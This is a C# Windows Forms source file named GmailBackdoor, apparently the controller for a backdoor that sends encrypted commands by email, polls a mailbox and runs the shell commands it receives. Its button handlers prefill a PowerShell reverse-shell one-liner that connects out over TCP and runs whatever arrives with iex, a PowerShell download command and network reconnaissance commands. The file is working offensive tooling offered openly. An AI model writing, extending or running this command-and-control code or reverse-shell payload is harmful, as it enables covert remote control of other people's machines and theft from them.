using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GmailBackdoor
{
    public partial class Main : Form
    {
        private const int MILLI = 1000;
        private const int MIN = 60;
        private System.Timers.Timer _mainTimer;

        public Main()
        {
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            try
            {
                _mainTimer = new System.Timers.Timer();
                _mainTimer.Interval = MILLI * MIN * .25;
                _mainTimer.AutoReset = true;
                _mainTimer.Start();

                _mainTimer.Elapsed += new System.Timers.ElapsedEventHandler(this.OnMainTimerEvent);
                this.ActiveControl = txtSystemCmd;
#if DEBUG
                chkCheckCommands.Checked = false;
#else
                chkCheckCommands.Checked = true;
#endif
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void OnMainTimerEvent(object source, System.Timers.ElapsedEventArgs e)
        {
            if (chkCheckCommands.Checked)
            {
                ParseEmailCommands();
            }
        }

        private void btnSystemCmd_Click(object sender, EventArgs e)
        {
            var msg = "HASH" + Environment.NewLine +
                "SystemCmd" + Environment.NewLine +
                txtSystemCmd.Text;

            var cypher = Utilities.EncryptStringAES(msg, SettingsManager.Get.EncrptKey);
            Email.SendMail("==CMD==", cypher);
            txtSystemCmd.Text = string.Empty;
        }

        private void ParseEmailCommands()
        {
            try
            {
                var messages = Email.CheckServerEmail();
                if (messages.Count > 0)
                {
                    foreach (var message in messages)
                    {
                        var lines = message.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.None);
                        if (lines.Length >= 2)
                        {
                            if (lines[1] == "SystemCmd")
                            {
                                Invoke(new Action(() => { txtReport.AppendText(Commands.SystemCmd.Go(lines[2])); }));
                            }
                            else
                            {
                                throw new Exception("Wrong command for command email");
                            }


                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btnCheck_Click(object sender, EventArgs e)
        {
            ParseEmailCommands();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            txtSystemCmd.Text = "powershell -nop -exec bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            txtSystemCmd.Text = "powershell Invoke-WebRequest \"https://raw.githubusercontent.com/shanefarris/CoreGameEngine/master/README.md\" -OutFile \"./out.txt\"";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            txtSystemCmd.Text = "ipconfig && route print";
        }
    }
}
